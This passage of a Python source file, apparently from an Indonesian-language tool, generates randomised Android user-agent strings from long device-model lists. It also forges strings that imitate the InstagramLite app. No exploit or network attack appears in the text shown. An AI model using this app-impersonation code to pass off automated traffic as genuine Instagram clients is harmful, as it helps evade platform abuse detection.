'M2011J18C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'Mi Note 10', 'Mi Note 10 Lite', 'Mi Note 10 Pro', 'Mi Note 11', 'Mi Note 2', 'MI Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 3', 'Mi Note 8 Pro', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE Pro', 'Mi Note Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'Mi Note10 Pro', 'Mi Note5', 'MI-ONE', 'MI-ONE C1', 'MI-ONEPlus', 'MI-ONE Plus', 'Mi Pad 4Plus', 'MI PAD', 'MI PAD 2', 'MI PAD 2', 'MiPad 3', 'MI PAD 3', 'MI PAD 4', 'MI PAD 4 PLUS', 'MI PAD 4 PLUS', 'Xiaomi Pad 5', 'Xiaomi Pad 5', '21051182G', '21051182C', 'Xiaomi Pad 5', 'M2105K81AC', 'M2105K81AC', 'M2105K81AC', '22081281AC', 'M2105K81C', 'M2105K81C', 'Mi Pad4 Wi-Fi', 'Mi Pad5 Wi-Fi', 'MI PLAY', 'MI PLAY Flow', 'MI PLAY', 'MI PLAY', 'MI PLAY', 'MI XL', 'Xiaomi Mi5', 'MiTV-AXSO0', 'MiTV4A', 'MiTV4-ANSM0', 'MiTV-MSSP0', 'MiTV-AXSO1', 'MiTV-AXSO2', 'MiTV4C', 'MiTV4I', 'MiTV4I', 'MiTV-MSSP2', 'MiTV-MSSP1', 'MiTV-MSSP3', 'MiTV-MOOQ0', 'MiTV-MOOQ0', 'MiTV-MTEQ0', 'MiTV-AESP0', 'MiTV-AYFR0', 'MiTV-ANSP0', 'MiTV-ANSP0', '22061218C', '22061218C', '22061218C', '22061218C', '22061218C', '2209116AG', 'POCOPHONE F1', 'POCO F1', 'Qin 1s+', 'Qin 2', 'QIN2 Pro', 'Qin 2 Pro', 'Redmi 01A', 'HM 1', '21061119DG', '220333QBI', 'Redmi 10', 'Redmi 10', '21061119AG', '21121119SG', '22011119UY', '22041219NY', '22041219G', 'Redmi 10 5G', '21061119BI', '22011119TI', '22041219I', '220233L2G', '220233L2I', '220333QNY', '220333QAG', '220333QL', 'Redmi 10I', 'Redmi 10S', 'M2004J7AC', 'M2004J7AC', 'M2004J7AC', 'M2004J15SC', 'M2004J7BC', 'M2004J7BC', 'M2004J7BC', 'Redmi 11 Lite', 'Redmi 11 lite', '22071219AI', '22071219AI', 'Redmi 11X', 'Redmi 12 5G', 'Redmi 12', '22120RN86G', '22126RN91Y', 'Redmi 12C', '2212ARNC4L', 'Redmi 12C', 'HM 1S', 'HM 1SW', 'Redmi 1S', 'HM 1SW', 'HM 1SC', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1SW', 'wt88047', 'Redmi 2', 'Redmi 2 Prime', 'wt88047', 'wt88047', 'HM 2A', 'HM 2A', 'HM 2A', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3S', 'Redmi 3S', 'Redmi 3S', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro', 'Redmi 6A', 'Redmi 7', 'Redmi 7 Pro', 'Redmi 7A', 'Redmi 7A', 'Redmi 7I', 'Redmi 7i', 'Redmi 8', 'Redmi 85781', 'Redmi 8A', 'Redmi 8A Dual', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'M2004J19C', 'M2010J19SI', 'Redmi 9 Power', 'Redmi 9 Prime', 'Redmi 9 Prime', 'Redmi 9 Pro', 'Redmi 99070', 'M2006C3LG', 'M2006C3LI', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'Redmi 9i', 'Redmi 9Prime', 'Redmi 9pro', 'M2010J19SY', 'M2010J19SG', 'M2010J19SL', 'Redmi 9T NFC', '220733SG', '220733SL', '220733SFG', '23028RN4DG', '23028RNCAG', 'Redmi A3', 'Redmi A8', 'Redmi A90', 'Redmi Go', 'Redmi K20', 'Redmi K20', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 Pro', 'Redmi K30 Pro', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'M2012K11AC', 'M2012K11AC', 'M2012K11AC', 'M2012K10C', 'M2012K10C', 'M2012K10C', 'M2012K11C', 'M2012K11C', 'M2012K11C', '22021211RC', '22021211RC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22011211C', '22011211C', '22011211C', '21121210C', '21121210C', '21121210C', '21121210C', '22041216I', '23013RK75C', '23013RK75C', 'Redmi K60', '22127RK46C', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'M2101K7AG', 'M2101K7AI', 'M2103K19G', 'M2103K19C', 'XIG02', 'M2101K6G', 'M2104K10AC', 'M2101K6R', 'M2101K7BG', 'M2101K7BNY', 'M2101K7BL', 'M2101K7BI', '22021119KR', 'M2103K19Y', 'Redmi Note 10T', 'M2103K19I', 'A101XM', 'M2003J15SC', 'M2003J15SC', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', '2201117TY', '2201117TG', '2201117TI', '2201117TL', '21091116AC', '21091116AC', '21091116AC', '2201116TG', '21091116C', '2201116TI', '2201116TG', '21091116C', '2201116SG', '2201116SR', '21091116UG', '21091116UC', '2201116SI', '22087RA4DI', '22087RA4DI', '22041219C', '22041219C', 'Redmi Note 11E', '2201116SC', 'Redmi Note 11R', 'Redmi Note 11R', '22095RA98C', '2201117SL', '2201117SY', '2201117SI', '2201117SG', '22031116BG', '21091116I', '21091116AI', '22041216C', '22041216C', '22041216C', '22041216C', '22041216C', '22041216UC', '22041216UC', '22041216UC', '22111317G', '23021RAAEG', '23021RAA2Y', 'Redmi Note 12', 'Redmi Note 12', 'Redmi Note 12', '22101316UP', '22101316G', '22101316I', '22101316C', '22101316C', '22101316UC', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UG', '2303CRA44A', 'Redmi Note 12S', '23030RAC7Y', 'Redmi Note 12S', 'Redmi Note 12S', 'Redmi Note 12S', '23049RAD8C', '23049RAD8C', '23049RAD8C', 'Redmi Note 13', 'Redmi Note 1LTE', 'Redmi Note 2', 'Redmi Note 2', 'Redmi Note 27', 'Redmi Note 3', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4A', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5A', 'Redmi note 6', 'redmi note 6', 'Redmi Note 6Pro', 'Redmi Note 7', 'Redmi Note 7', 'Redmi Note 7S', 'Redmi Note 7S', 'M1901F71', 'Redmi Note 7S', 'Redmi Note 8', 'Redmi Note 8', 'M1908C3JGG', 'M1908C3JGG', 'Redmi Note 8T', 'Redmi Note 9', 'M2010J19SC', 'M2010J19SC', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J17C', 'M2007J17C', 'M2007J17C', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'M2007J22G', 'A001XM', 'Redmi Note10 JE', 'Redmi Note7', 'Redmi Note8', 'Redmi Note8T', '22081283G', '22081283C', 'Redmi Pad', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi X', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y2', 'Redmi Y3', 'Redmi Y3'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Manual':
                    try:
                        for z in Random:
                            self.useragent = random.choice(z.split('|'))
                        return (self.useragent)
                    except (Exception):
                        self.android_version = random.choice(['12', '11', '13'])
                        self.android_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                        self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                        return (self.useragent)
                elif self.jenis == 'File':
                    try:
                        self.useragent = random.choice(Random)
                        if len(self.useragent) == 0:
                            self.android_version = random.choice(['12', '11', '13'])
                            self.android_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                            return (self.useragent)
                        else:
                            return (self.useragent)
                    except (Exception):
                        self.android_version = random.choice(['12', '11', '13'])
                        self.android_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
                        self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                        return (self.useragent)
                else:
                    self.android_version = random.choice(['11', '9', '10', '12'])
                    self.android_model = random.choice(['TB-X704A', 'Lenovo TB-X306F', 'Lenovo TB-X505X', 'Lenovo K12 Pro', 'TB328FU', 'Lenovo TB-X606X', 'Lenovo L70081', 'Lenovo L39051', 'Lenovo K12 Note'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                return (self.useragent)
            
    def Instagram_Useragent(self):
        self.dpi_pixel = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
        self.browser_version = random.choice(['113.0.5672.132', '113.0.5672.131', '113.0.5672.77', '113.0.5672.76', '112.0.5615.136', '112.0.5615.135', '112.0.5615.101', '112.0.5615.100', '112.0.5615.48', '112.0.5615.47', '111.0.5563.116', '111.0.5563.115', '111.0.5563.58', '111.0.5563.57', '111.0.5563.49', '111.0.5563.48', '110.0.5481.154', '110.0.5481.153', '110.0.5481.65', '110.0.5481.64', '110.0.5481.63', '110.0.5481.61', '109.0.5414.118', '109.0.5414.117', '109.0.5414.86', '109.0.5414.85', '108.0.5359.128', '108.0.5359.79', '108.0.5359.61', '107.0.5304.141', '107.0.5304.105', '107.0.5304.91', '107.0.5304.54', '106.0.5249.126', '106.0.5249.118', '106.0.5249.79', '106.0.5249.65', '105.0.5195.136', '105.0.5195.124', '105.0.5195.79', '105.0.5195.77', '105.0.5195.68', '104.0.5112.97', '104.0.5112.69', '103.0.5060.129', '103.0.5060.71', '103.0.5060.70', '103.0.5060.53', '102.0.5005.125', '102.0.5005.99', '102.0.5005.98', '102.0.5005.78', '102.0.5005.59', '102.0.5005.58', '101.0.4951.74', '101.0.4951.61', '101.0.4951.41', '101.0.4951.15 ', '100.0.4896.127', '100.0.4896.88'])
        if len(Useragent) == 0:
            self.android_version = random.choice(['10', '11', '9', '12', '13'])
            self.device_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 'RMX2027', 'RMX2021', 'RMX3623', 'RMX3581', 'RMX3690', 'RMX3501', 'RMX3503', 'RMX3501', 'RMX3624', 'RMX3511', 'RMX3710', 'RMX3311', 'RMX3310', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3031', 'RMX3370', 'RMX3370', 'RMX3370', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3357', 'RMX3561', 'RMX3561', 'RMX3560', 'RMX3562', 'RMX3563', 'RMX3371', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3708', 'RMX3706', 'RMX3706', 'RMX3350', 'RMX3350', 'RMX3350', 'RMX2193', 'RMX2193', 'RMX2161', 'RMX2163', 'RMX2050', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3286', 'RMX3572', 'RMX3395', 'RMX3395', 'RMX3396', 'RMX3396', 'RMX3430', 'RMX3516', 'RMX3235', 'RMX3235', 'RMX3506', 'RMX3506', 'RMP2103', 'RMP2102', 'RMP2102', 'RMP2106', 'RMP2105', 'RMP2107', 'RMP2108', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2117', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX2173', 'RMX3161', 'RMX3161', 'RMX3161', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX2205', 'RMX3142', 'RMX3142', 'RMX3461', 'RMX3461', 'RMX3478', 'RMX3478', 'RMX3372', 'RMX3372', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 'RMX3122', 'RMX3121', 'RMX3125', 'RMX3125', 'RMX3042', 'RMX3041', 'RMX3041', 'RMX3043', 'RMX3042', 'RMX3092', 'RMX3093', 'RMX3092', 'RMX3611', 'RMX3611', 'RMX3610', 'RMX3611', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3571', 'RMX3475', 'RMX2201', 'RMX2200', 'RMX2200', 'RMX2200', 'RMX2111', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1901', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX1931', 'RMX2083', 'RMX2142', 'RMX2081', 'RMX2086', 'RMX2144', 'RMX2071', 'RMX2071', 'RMX2071', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2072', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2176', 'RMX2121', 'RMX2121', 'RMX2121', 'RMX3115', 'RMX3115', 'RMX3115', 'RMX1921', 'RMX1921', 'RMX1921'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; Realme; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
            return (self.useragent)
        else:
            for z in Useragent:
                self.jenis = random.choice(z.split(',')).capitalize()
                if self.jenis == 'Realme':
                    self.android_version = random.choice(['10', '11', '9', '12', '13'])
                    self.device_model = random.choice(['CPH1861', 'RMX3630', 'RMX3663', 'RMX3663', 'RMX3661', 'RMX3687', 'RMX3686', 'RMX3687', 'RMX3687', 'RMX1805', 'RMX1809', 'RMX1805', 'RMX1801', 'RMX1807', 'RMX1821', 'RMX1825', 'RMX1851', 'RMX1827', 'RMX1911', 'RMX1971', 'RMX2030', 'RMX1925', 'RMX2001', 'RMX2061', 'RMX2040', 'RMX2002', 'RMX2151', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3388', 'RMX3474', 'RMX3474', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3491', 'RMX3612', 'RMX1811', 'RMX2185', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX2101', 'RMX1941', 'RMX1941', 'RMX1945', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3261', 'RMX3263', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3269', 'RMX3268', 'RMX2020', 